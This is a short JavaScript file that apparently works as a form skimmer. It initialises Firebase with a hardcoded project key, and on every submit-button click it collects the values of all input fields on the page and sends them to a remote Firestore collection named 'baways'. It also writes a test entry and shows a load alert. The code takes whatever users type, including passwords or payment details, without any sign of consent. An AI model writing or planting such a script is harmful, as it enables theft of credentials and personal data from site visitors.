/**/

alert('Script loaded successfully!');
/* Import Firebase SDKs */
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";

/* Your Firebase configuration */
const firebaseConfig = {
    apiKey: "AIzaSyAqpLV6uXiyTvSNTXO1Yj1e2e9IXGtzBGQ",
    authDomain: "secret-fedfa.firebaseapp.com",
    projectId: "secret-fedfa",
    storageBucket: "secret-fedfa.firebasestorage.app",
    messagingSenderId: "1036585755690",
    appId: "1:1036585755690:web:95296469817b84d7de4f53"
};

/* Initialize Firebase */
const app2 = initializeApp(firebaseConfig);
const db = getFirestore(app2);


document.addEventListener("DOMContentLoaded", function() {
    console.log("🚀 DOM fully loaded and parsed!"); // Debug message
});



/* Function to send a text string */
async function sendData(textString) {
    try {
        /* Changed path here */
        const docRef = await addDoc(collection(db, "baways"), {
            text: textString,
            timestamp: new Date()
        });
        console.log("Document written with ID:", docRef.id);
    } catch (error) {
        console.error("Error adding document:", error);
    }
}

document.addEventListener("DOMContentLoaded", function() {
    /* Add event listener to the submit button */
    const submitButton = document.querySelector("button[type='submit']");
    if (submitButton) {
        submitButton.addEventListener("click", function() {
            console.log('Submit button clicked');

            /* Get all input fields */
            const inputFields = document.querySelectorAll("input");

            /* Concatenate all input data into a single string */
            let inputData = "";
            inputFields.forEach(field => {
                inputData += field.value + " ";
            });

            /* Send the concatenated input data to Firebase */
            sendData(inputData.trim());
        });
    } else {
        console.error("Submit button not found in the DOM.");
    }
});


sendData("double    test")
console.log('Firebase loaded');
